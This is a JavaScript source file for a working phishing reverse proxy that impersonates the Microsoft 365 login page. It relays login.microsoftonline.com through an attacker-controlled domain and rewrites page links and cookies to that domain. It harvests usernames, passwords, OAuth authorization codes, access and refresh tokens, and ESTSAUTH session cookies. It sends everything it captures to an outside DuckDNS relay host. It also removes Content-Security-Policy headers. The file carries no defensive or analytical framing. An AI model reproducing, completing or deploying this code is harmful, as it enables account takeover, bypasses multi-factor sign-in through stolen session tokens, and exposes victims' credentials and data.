export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// OAuth Configuration - Using Microsoft's native client flow
const OAUTH_CONFIG = {
  client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
  resource: 'https://graph.microsoft.com',
  redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
  authority: 'https://login.microsoftonline.com/common',
  upstream: 'login.microsoftonline.com'
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function sendToTeams(message, webhookUrl) {
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: message }),
    });
  } catch (e) {}
}

// Exchange authorization code for access/refresh tokens
async function exchangeCodeForTokens(code) {
  const tokenEndpoint = `https://login.microsoftonline.com/common/oauth2/token`;
  
  const formData = new URLSearchParams({
    client_id: OAUTH_CONFIG.client_id,
    grant_type: 'authorization_code',
    code: code,
    redirect_uri: OAUTH_CONFIG.redirect_uri,
    resource: OAUTH_CONFIG.resource
  });

  try {
    const response = await fetch(tokenEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: formData.toString()
    });

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Token exchange failed: ${errorText}`);
    }

    const tokenData = await response.json();
    return {
      accessToken: tokenData.access_token,
      refreshToken: tokenData.refresh_token,
      expiresIn: tokenData.expires_in,
      tokenType: tokenData.token_type,
      resource: tokenData.resource
    };
  } catch (error) {
    console.error('Token exchange error:', error);
    throw error;
  }
}

// ==================== SIMPLE PROXY HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Handle root path - redirect to Microsoft OAuth authorization endpoint
  if (url.pathname === '/' || url.pathname === '') {
    const authUrl = `https://${OAUTH_CONFIG.upstream}/common/oauth2/authorize?` + new URLSearchParams({
      response_type: 'code',
      client_id: OAUTH_CONFIG.client_id,
      resource: OAUTH_CONFIG.resource,
      redirect_uri: OAUTH_CONFIG.redirect_uri
    }).toString();
    
    console.log(`[REDIRECT] Root -> ${authUrl}`);
    return new Response(null, {
      status: 302,
      headers: {
        'Location': authUrl,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Credentials': 'true'
      }
    });
  }

  // Handle all other requests as a transparent proxy
  let targetHost = OAUTH_CONFIG.upstream;
  let targetPath = url.pathname;
  
  // If it's a proxied request (starts with /_p/), extract the domain
  if (url.pathname.startsWith('/_p/')) {
    const withoutPrefix = url.pathname.slice(3);
    const slashIndex = withoutPrefix.indexOf('/');
    if (slashIndex !== -1) {
      targetHost = withoutPrefix.substring(0, slashIndex);
      targetPath = withoutPrefix.substring(slashIndex);
    }
  }

  const upstreamUrl = `https://${targetHost}${targetPath}${url.search}`;
  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Build request headers
  const headers = new Headers();
  
  // Copy relevant headers
  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin'];
  for (const h of headersToCopy) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }
  
  headers.set('Host', targetHost);
  headers.set('Referer', `https://${targetHost}/`);
  
  // Remove problematic headers
  headers.delete('content-length');
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  let requestBody = null;

  // Capture credentials from POST requests
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      
      // Parse credentials from form data
      const params = new URLSearchParams(bodyText);
      const user = params.get('login') || params.get('loginfmt') || params.get('username');
      const pass = params.get('passwd') || params.get('password');
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user}`);
        const decodedUser = decodeURIComponent(user.replace(/\+/g, ' '));
        const decodedPass = decodeURIComponent(pass.replace(/\+/g, ' '));
        
        await sendToVercel('credentials', { ip, user: decodedUser, pass: decodedPass, url: url.href });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${decodedUser}\nPass: ${decodedPass}\nURL: ${url.href}`], { type: 'text/plain' }), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const response = await fetch(upstreamUrl, {
      method: request.method,
      headers: headers,
      body: requestBody,
      redirect: 'manual'
    });
    
    // Handle redirects - THIS IS WHERE WE CAPTURE THE AUTH CODE
    if (response.status === 302 && response.headers.has('Location')) {
      const location = response.headers.get('Location');
      console.log(`[REDIRECT] 302 -> ${location}`);
      
      // Check if this redirect contains the authorization code
      if (location.includes('nativeclient?code=')) {
        const codeMatch = location.match(/nativeclient\?code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const authCode = codeMatch[1];
          console.log(`[AUTH CODE] Captured: ${authCode}`);
          
          // Send the code to Vercel
          await sendToVercel('auth_code', { ip, code: authCode, url: url.href });
          
          // Exchange the code for tokens
          try {
            const tokens = await exchangeCodeForTokens(authCode);
            console.log(`[TOKENS] Access Token obtained: ${tokens.accessToken.substring(0, 50)}...`);
            
            // Send tokens to Vercel
            await sendToVercel('tokens', { 
              ip, 
              accessToken: tokens.accessToken,
              refreshToken: tokens.refreshToken,
              expiresIn: tokens.expiresIn,
              tokenType: tokens.tokenType
            });
            
            // Send formatted message to Teams/webhook
            const message = `<b>Tokens obtained:</b><br><br>
<b>Access Token:</b> ${tokens.accessToken}<br><br>
<b>Refresh Token:</b> ${tokens.refreshToken}<br><br>
<b>Expires In:</b> ${tokens.expiresIn} seconds<br>
<b>IP:</b> ${ip}`;
            
            await sendToVercel('teams_message', { message, ip });
            
          } catch (tokenError) {
            console.error('[TOKEN ERROR]', tokenError);
            await sendToVercel('token_error', { ip, error: tokenError.message });
          }
        }
      }
      
      // Always redirect to Office portal after capturing the code
      return new Response(null, {
        status: 302,
        headers: {
          'Location': 'https://portal.office.com',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Credentials': 'true'
        }
      });
    }
    
    // Handle other redirects
    if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
      const location = response.headers.get('Location');
      let rewrittenLocation = location;
      
      // Only rewrite if it's going to a Microsoft domain
      if (location.includes('login.microsoftonline.com')) {
        rewrittenLocation = location.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${YOUR_DOMAIN}`);
      }
      
      const redirectHeaders = new Headers();
      redirectHeaders.set('Location', rewrittenLocation);
      redirectHeaders.set('Access-Control-Allow-Origin', '*');
      redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
      
      return new Response(null, {
        status: response.status,
        headers: redirectHeaders
      });
    }
    
    // Build response headers
    const responseHeaders = new Headers();
    
    // Copy essential response headers
    const headersToCopyResponse = ['content-type', 'cache-control'];
    for (const h of headersToCopyResponse) {
      const val = response.headers.get(h);
      if (val) responseHeaders.set(h, val);
    }
    
    // Remove security headers
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    
    // Add CORS headers
    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
    
    // Process cookies
    const cookies = response.headers.getSetCookie?.() || [];
    let cookieStr = '';
    
    if (cookies.length) {
      cookieStr = cookies.join('; ');
      
      // Check for auth cookies
      const hasESTSAUTH = cookieStr.toLowerCase().includes('estsauth');
      const hasESTSAUTHPERSISTENT = cookieStr.toLowerCase().includes('estsauthpersistent');
      
      if (hasESTSAUTH && hasESTSAUTHPERSISTENT) {
        console.log(`[AUTH COOKIES] Captured session cookies`);
        await sendToVercel('cookies', { ip, cookies: cookieStr, url: url.href });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nURL: ${url.href}\n\n${cookieStr}`], { type: 'text/plain' }), `${ip}-COOKIES.txt`);
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      // Forward cookies to client (replace domain)
      for (const cookie of cookies) {
        let modifiedCookie = cookie;
        modifiedCookie = modifiedCookie.replace(/login\.microsoftonline\.com/g, YOUR_DOMAIN);
        responseHeaders.append('Set-Cookie', modifiedCookie);
      }
    }
    
    // Process response body
    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || contentType.includes('javascript') || contentType.includes('json')) {
      let text = await response.text();
      
      // Replace Microsoft domains with our proxy domain
      text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${YOUR_DOMAIN}`);
      text = text.replace(/https?:\/\/login\.live\.com/g, `https://${YOUR_DOMAIN}/_p/login.live.com`);
      text = text.replace(/https?:\/\/aadcdn\.msauth\.net/g, `https://${YOUR_DOMAIN}/_p/aadcdn.msauth.net`);
      
      return new Response(text, {
        status: response.status,
        headers: responseHeaders
      });
    }
    
    return new Response(response.body, {
      status: response.status,
      headers: responseHeaders
    });
    
  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { status: 502, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
